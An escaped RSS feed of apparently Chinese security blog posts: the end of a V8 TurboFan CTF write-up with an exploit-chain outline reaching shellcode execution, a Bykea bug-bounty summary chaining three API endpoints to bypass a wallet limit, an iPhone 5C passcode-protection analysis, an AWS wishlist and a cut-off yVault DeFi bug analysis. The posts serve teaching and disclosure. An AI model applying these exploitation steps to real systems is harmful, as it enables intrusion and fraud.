&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们可以查看第一个生成的图，选择&amp;quot;bytecode graph builder&amp;quot;选项。JSCall节点对应于Math.random调用，NumberConstant和SpeculativeNumberAdd节点由x+2和y+3语句生成。&lt;/p&gt;
&lt;h2 id=&#34;类型阶段&#34;&gt;类型阶段
&lt;/h2&gt;&lt;p&gt;在图形创建之后是优化阶段，顾名思义，它运行各种优化过程。优化过程可以在多个阶段调用。其中一个早期优化阶段称为TyperPhase，由OptimizeGraph运行。&lt;/p&gt;
&lt;p&gt;当Typer运行时，它会访问图中的每个节点并尝试减少它们。例如，对于JSCall节点，它会调用JSCallTyper。如果被调用的函数是内置函数，它将为其关联一个类型。&lt;/p&gt;
&lt;h2 id=&#34;类型降低&#34;&gt;类型降低
&lt;/h2&gt;&lt;p&gt;在OptimizeGraph中，类型降低紧随类型分析之后。这个阶段会经过更多的reducer。例如，TypedOptimization::Reduce会在访问节点时调用ReduceSpeculativeNumberAdd。&lt;/p&gt;
&lt;h1 id=&#34;边界检查节点&#34;&gt;边界检查节点
&lt;/h1&gt;&lt;p&gt;我们的最终实验涉及CheckBounds节点。基本上，带有CheckBounds操作码的节点在加载和存储之前添加边界检查。&lt;/p&gt;
&lt;p&gt;考虑以下代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;opt_me&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;values&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1337&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;       &lt;span class=&#34;c1&#34;&gt;// HeapConstant &amp;lt;FixedArray[2]&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                   &lt;span class=&#34;c1&#34;&gt;// NumberConstant[10] | Range(10,10)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;foo&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                      &lt;span class=&#34;c1&#34;&gt;// NumberConstant[5] | Range(5,5)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                                &lt;span class=&#34;c1&#34;&gt;// Phi | Range(5,10)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                &lt;span class=&#34;c1&#34;&gt;// SpeculativeSafeIntegerAdd | Range(7,12)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                 &lt;span class=&#34;c1&#34;&gt;// SpeculativeSafeIntegerAdd | Range(1007,1012)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                    &lt;span class=&#34;c1&#34;&gt;// SpeculativeNumberMultiply | Range(2014,2024)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                   &lt;span class=&#34;c1&#34;&gt;// SpeculativeNumberBitwiseAnd | Range(0,10)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                    &lt;span class=&#34;c1&#34;&gt;// SpeculativeNumberDivide | PlainNumber[r][s][t]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                    &lt;span class=&#34;c1&#34;&gt;// SpeculativeNumberBitwiseAnd | Range(0,1)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;values&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;// CheckBounds | Range(0,1)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;为了防止values[y]使用越界索引，会生成一个CheckBounds节点。&lt;/p&gt;
&lt;h1 id=&#34;duplicateadditionreducer挑战&#34;&gt;DuplicateAdditionReducer挑战
&lt;/h1&gt;&lt;p&gt;Stephen Röttger为Google CTF 2018编写的DuplicateAdditionReducer是一个很好的TurboFan挑战，它添加了一个新的reducer来优化类似x + 1 + 1的情况。&lt;/p&gt;
&lt;h2 id=&#34;理解漏洞&#34;&gt;理解漏洞
&lt;/h2&gt;&lt;p&gt;V8使用IEEE-754双精度浮点数表示数字。这意味着它可以使用52位编码整数。因此最大值是pow(2,53)-1，即9007199254740991。大于此值的数字不能全部表示。因此，在计算大于该值的值时会出现精度损失。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
&lt;/h2&gt;&lt;p&gt;现在我们已经理解了漏洞，我们可能想要改进我们的原语。例如，获得读取和写入更多内存的能力会很有趣。&lt;/p&gt;
&lt;p&gt;完整的利用链包括以下步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;破坏FixedDoubleArray&lt;/li&gt;
&lt;li&gt;破坏JSArray并泄漏ArrayBuffer的后备存储&lt;/li&gt;
&lt;li&gt;获取伪造对象&lt;/li&gt;
&lt;li&gt;构建任意读/写原语&lt;/li&gt;
&lt;li&gt;覆盖WASM RWX内存&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最终，我们可以将shellcode写入RWX内存并执行它。&lt;/p&gt;
&lt;h1 id=&#34;结论&#34;&gt;结论
&lt;/h1&gt;&lt;p&gt;本文详细分析了V8引擎中TurboFan优化编译器的一个漏洞，通过精度丢失问题实现越界读写，最终构建出完整的利用链实现任意代码执行。希望您喜欢这篇文章！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>我在re:Invent大会上的技术诉求：从跨AZ带宽定价到CHERI实例</title>
        <link>http://localhost:1313/p/%E6%88%91%E5%9C%A8reinvent%E5%A4%A7%E4%BC%9A%E4%B8%8A%E7%9A%84%E6%8A%80%E6%9C%AF%E8%AF%89%E6%B1%82%E4%BB%8E%E8%B7%A8az%E5%B8%A6%E5%AE%BD%E5%AE%9A%E4%BB%B7%E5%88%B0cheri%E5%AE%9E%E4%BE%8B/</link>
        <pubDate>Sun, 03 Aug 2025 08:00:39 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%88%91%E5%9C%A8reinvent%E5%A4%A7%E4%BC%9A%E4%B8%8A%E7%9A%84%E6%8A%80%E6%9C%AF%E8%AF%89%E6%B1%82%E4%BB%8E%E8%B7%A8az%E5%B8%A6%E5%AE%BD%E5%AE%9A%E4%BB%B7%E5%88%B0cheri%E5%AE%9E%E4%BE%8B/</guid>
        <description>&lt;p&gt;作为AWS Hero，我获得了免费参加AWS re:Invent大会的机会。虽然我很少对多数演讲感兴趣——往年我参加过一些&amp;quot;高级&amp;quot;讲座，但内容都未超出已发布的文档范围——但我发现这是与亚马逊员工交流的绝佳机会。&lt;/p&gt;
&lt;p&gt;今年我有一长串诉求清单，考虑到可能引起亚马逊员工（甚至非亚马逊人士）的兴趣，我决定在此公开分享：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;增加re:Invent大会上的亚马逊开源开发者数量&lt;/strong&gt;&lt;br&gt;
我期待周三与Valkey开发者会面，但对Firecracker开发者无人参会感到失望。亚马逊有不派工程师参会除非他们演讲的政策（我希望能改变这一政策），但对开源开发者而言，参会结识潜在贡献者至关重要。如果你的开源团队不参加会议，无论代码采用什么许可证，都不算真正在做开源。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;降低跨可用区(AZ)带宽定价&lt;/strong&gt;&lt;br&gt;
我甚至不太在意成本本身，但人们对跨AZ带宽的担忧导致他们设计出糟糕的系统架构。亚马逊&amp;quot;良好架构框架&amp;quot;中的一条准则是将工作负载部署到多个位置，并明确指出使用单一可用区是个问题——但对跨AZ带宽的担忧（即使最终证明是多余的）阻碍了人们遵循这一准则。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;机架级EBS存储&lt;/strong&gt;&lt;br&gt;
当前&amp;quot;SSD&amp;quot;EBS卷的I/O延迟表明它们与访问的EC2实例相距甚远。而某些EC2实例类型直接附加SSD，I/O性能显著提升——但耐久性低（实例终止数据即丢失）且缺乏弹性。将EBS存储部署在与EC2节点相同的机架上，可提供介于两者之间的解决方案，实现比跨数据中心更低的延迟，同时保持卷大小的灵活性。用户需接受&amp;quot;在此实例同机架创建卷&amp;quot;可能返回&amp;quot;该机架磁盘已满&amp;quot;的情况，但至少在实例启动时可以寻找有足够本地磁盘的机架。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;支持CHERI的安全实例&lt;/strong&gt;&lt;br&gt;
这是我长期以来的愿望清单项目。CHERI在安全性方面具有巨大优势，哪家云厂商率先实现将遥遥领先竞争对手。我知道亚马逊（和其他云厂商）拥有用于研究的Morello开发板。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Marketplace支持&amp;quot;待发布&amp;quot;版本&lt;/strong&gt;&lt;br&gt;
当我在AWS Marketplace添加新的FreeBSD版本时，需经过审批流程并复制到所有EC2区域，然后Marketplace更新产品列表并发送新版本邮件通知。这常导致亚马逊发送新FreeBSD版本邮件比我官方发布公告还早几天。我希望能够预先告知Marketplace即将发布的FreeBSD版本，让他们准备就绪但暂不更新网站或发送邮件，直到我准备好官方公告（通常会给镜像和云服务几天同步时间）。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;此外，我还向Zoom提出改进建议：当从FreeBSD笔记本电脑加入会议时，Zoom网站应能通过用户代理字符串识别没有客户端，直接提供在浏览器中开会的选项，而不是反复尝试打开客户端。Zoom团队立即理解问题，甚至考虑将Linux客户端移植到FreeBSD。&lt;/p&gt;
&lt;p&gt;关于透明度说明：除了提供免费参会和差旅，亚马逊还赞助我的FreeBSD工作。他们资助的内容约一半是EC2相关，另一半是FreeBSD发布工程。没有他们的支持，许多重要功能将无法出现在FreeBSD 14.2-RELEASE中。感谢亚马逊。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>苹果技术上有能力配合FBI解锁iPhone 5C——深入解析iOS安全机制</title>
        <link>http://localhost:1313/p/%E8%8B%B9%E6%9E%9C%E6%8A%80%E6%9C%AF%E4%B8%8A%E6%9C%89%E8%83%BD%E5%8A%9B%E9%85%8D%E5%90%88fbi%E8%A7%A3%E9%94%81iphone-5c%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90ios%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/</link>
        <pubDate>Sun, 03 Aug 2025 07:49:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%8B%B9%E6%9E%9C%E6%8A%80%E6%9C%AF%E4%B8%8A%E6%9C%89%E8%83%BD%E5%8A%9B%E9%85%8D%E5%90%88fbi%E8%A7%A3%E9%94%81iphone-5c%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90ios%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/</guid>
        <description>&lt;h1 id=&#34;fbi的技术要求&#34;&gt;FBI的技术要求
&lt;/h1&gt;&lt;p&gt;在枪击案调查中，FBI发现一部属于袭击者的iPhone 5C。该设备属于圣贝纳迪诺县公共卫生部（袭击者工作单位），FBI已获得搜查许可。但由于iOS设备的加密机制，FBI无法通过猜测密码解锁设备。在iOS设备中，几乎所有重要文件都采用设备密码和出厂时嵌入的硬件密钥组合加密。&lt;/p&gt;
&lt;p&gt;iPhone密码猜测面临三大障碍：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;多次错误输入后iOS可能完全擦除用户数据&lt;/li&gt;
&lt;li&gt;必须通过物理设备手动逐个输入PIN码&lt;/li&gt;
&lt;li&gt;每次错误输入后iOS会引入延迟&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;为此，FBI通过法院命令向苹果提出三项技术协助要求：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;绕过或禁用自动擦除功能&lt;/li&gt;
&lt;li&gt;允许通过物理端口/蓝牙/Wi-Fi等电子方式提交密码&lt;/li&gt;
&lt;li&gt;消除密码尝试之间的人为延迟&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;简言之，FBI希望实现：无限次密码尝试、硬件允许的最快尝试速度、通过外部设备自动提交密码。&lt;/p&gt;
&lt;h1 id=&#34;技术实现方案&#34;&gt;技术实现方案
&lt;/h1&gt;&lt;p&gt;FBI要求苹果提供特殊签名的iOS软件镜像(SIF)，该镜像将：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;仅在目标设备上运行&lt;/li&gt;
&lt;li&gt;通过DFU模式加载到设备RAM&lt;/li&gt;
&lt;li&gt;实现上述三项功能&lt;/li&gt;
&lt;li&gt;在政府或苹果设施执行解锁操作&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这相当于要求苹果开发一个定制版iOS（可戏称为FBiOS），该版本将：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;忽略密码输入延迟&lt;/li&gt;
&lt;li&gt;不限制错误尝试次数&lt;/li&gt;
&lt;li&gt;允许外接设备辅助密码猜测&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;安全飞地secure-enclave的挑战&#34;&gt;安全飞地(Secure Enclave)的挑战
&lt;/h1&gt;&lt;p&gt;配备A7及以上处理器的设备包含独立的安全飞地(SE)，它：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;管理数据保护API、Apple Pay等的加密密钥访问&lt;/li&gt;
&lt;li&gt;采用类似核武器发射的双密钥系统（密码+硬件密钥）&lt;/li&gt;
&lt;li&gt;自主维护错误尝试计数器并实施延迟（最长1小时）&lt;/li&gt;
&lt;li&gt;完全独立于iOS操作系统&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但涉案的iPhone 5C（A6处理器）没有安全飞地，其密码保护完全由iOS软件实现，因此单个固件更新即可绕过安全限制。&lt;/p&gt;
&lt;h1 id=&#34;技术可行性结论&#34;&gt;技术可行性结论
&lt;/h1&gt;&lt;p&gt;对于iPhone 5C：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;密码延迟和擦除功能由软件实现，可通过固件更新修改&lt;/li&gt;
&lt;li&gt;苹果可添加对外设密码输入的支持&lt;/li&gt;
&lt;li&gt;硬件密钥虽不可读取，但iOS可高速查询（每80ms一次尝试）
&lt;ul&gt;
&lt;li&gt;4位PIN码：约30分钟破解&lt;/li&gt;
&lt;li&gt;6位PIN码：数小时&lt;/li&gt;
&lt;li&gt;6位字母数字密码：数年&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;苹果可通过以下方式降低滥用风险：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将定制固件锁定到特定设备&lt;/li&gt;
&lt;li&gt;自行执行恢复操作而不向FBI提供固件&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;更新说明&#34;&gt;更新说明
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;软件更新安全飞地不会擦除用户数据&lt;/li&gt;
&lt;li&gt;苹果同样可通过软件更新绕过配备安全飞地设备的安全措施&lt;/li&gt;
&lt;li&gt;自iOS 8起，大多数应用数据默认加密，必须猜测密码才能访问&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>Bykea漏洞报告：绕过青铜合作伙伴钱包限制接受负余额行程的技术分析</title>
        <link>http://localhost:1313/p/bykea%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E7%BB%95%E8%BF%87%E9%9D%92%E9%93%9C%E5%90%88%E4%BD%9C%E4%BC%99%E4%BC%B4%E9%92%B1%E5%8C%85%E9%99%90%E5%88%B6%E6%8E%A5%E5%8F%97%E8%B4%9F%E4%BD%99%E9%A2%9D%E8%A1%8C%E7%A8%8B%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 07:38:37 +0800</pubDate>
        
        <guid>http://localhost:1313/p/bykea%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E7%BB%95%E8%BF%87%E9%9D%92%E9%93%9C%E5%90%88%E4%BD%9C%E4%BC%99%E4%BC%B4%E9%92%B1%E5%8C%85%E9%99%90%E5%88%B6%E6%8E%A5%E5%8F%97%E8%B4%9F%E4%BD%99%E9%A2%9D%E8%A1%8C%E7%A8%8B%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;漏洞技术细节&#34;&gt;漏洞技术细节
&lt;/h3&gt;&lt;p&gt;安全研究员&lt;code&gt;@bugbountywithmarco&lt;/code&gt;发现Bykea平台存在业务逻辑缺陷，允许钱包余额为负的青铜级合作伙伴绕过平台限制接受行程订单。通过串联调用三个后端API端点实现漏洞利用：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;初始请求&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;GET /v2/:city_id/bookings&lt;/code&gt; 获取城市预订信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;位置更新&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;PUT /api/v2/driver/update/location&lt;/code&gt; 携带任意&lt;code&gt;trip_id&lt;/code&gt;更新司机位置&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;报价提交&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;POST /api/v2/offer/bid&lt;/code&gt; 提交行程报价&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过这种调用链，负余额司机可重置其可用状态并成功提交报价，从而绕过钱包余额限制非法获取行程订单。&lt;/p&gt;
&lt;h3 id=&#34;时间线摘要&#34;&gt;时间线摘要
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;2024-11-27 17:43 UTC 漏洞提交&lt;/li&gt;
&lt;li&gt;2024-11-28 07:19 UTC 获得赏金&lt;/li&gt;
&lt;li&gt;初始评级8.6（高危）后调整为6.5（中危）&lt;/li&gt;
&lt;li&gt;2025-06-13 漏洞报告公开&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术影响&#34;&gt;技术影响
&lt;/h3&gt;&lt;p&gt;该漏洞属于&lt;strong&gt;业务逻辑错误&lt;/strong&gt;类别，暴露了三个关键问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;端点权限校验不完善&lt;/li&gt;
&lt;li&gt;状态管理机制存在缺陷&lt;/li&gt;
&lt;li&gt;负余额检测逻辑可被绕过&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;平台最终通过增强钱包状态校验机制修复该漏洞。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>踩到DeFi乐高积木：yVault漏洞分析与修复</title>
        <link>http://localhost:1313/p/%E8%B8%A9%E5%88%B0defi%E4%B9%90%E9%AB%98%E7%A7%AF%E6%9C%A8yvault%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D/</link>
        <pubDate>Sun, 03 Aug 2025 07:27:45 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%B8%A9%E5%88%B0defi%E4%B9%90%E9%AB%98%E7%A7%AF%E6%9C%A8yvault%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D/</guid>
        <description>&lt;h1 id=&#34;意外踩到defi乐高积木---trail-of-bits博客&#34;&gt;意外踩到DeFi乐高积木 - Trail of Bits博客
&lt;/h1&gt;&lt;p&gt;yVault的初始版本包含了一个可被攻击者操纵的yUSDC价格计算逻辑，可能导致资金池资产被耗尽。幸运的是，开发者Andre反应迅速，禁用了问题代码，保住了当时约40万美元的资金。这个漏洞凸显了DeFi领域因组合性带来的复杂性风险。&lt;/p&gt;
&lt;h2 id=&#34;什么是yvault&#34;&gt;什么是yVault？
&lt;/h2&gt;&lt;p&gt;2020年7月25日，yEarn推出了名为yVault的新服务：用户可将代币存入金库，金库会将这些代币提供给能最大化利息的DeFi协议。初始版本支持USDC并与USDC/MUSD Balancer池集成。金库持有的任何USDC都将作为流动性提供给Balancer池，并获得BPT代币作为回报。&lt;/p&gt;
&lt;p&gt;用户存入USDC可获得yUSDC，反之销毁yUSDC可提取USDC。这两种操作依赖于动态计算的汇率，定义为合约持有的BPT价值与yUSDC总供应量的比率。由于交易者支付费用时BPT价值上升，每个yUSDC代币的价值会随时间缓慢增长。&lt;/p&gt;
&lt;p&gt;yVault发布一小时内，用户已存入约40万USDC，这促使我立即查看了其代码。&lt;/p&gt;
&lt;h2 id=&#34;漏洞是什么&#34;&gt;漏洞是什么？
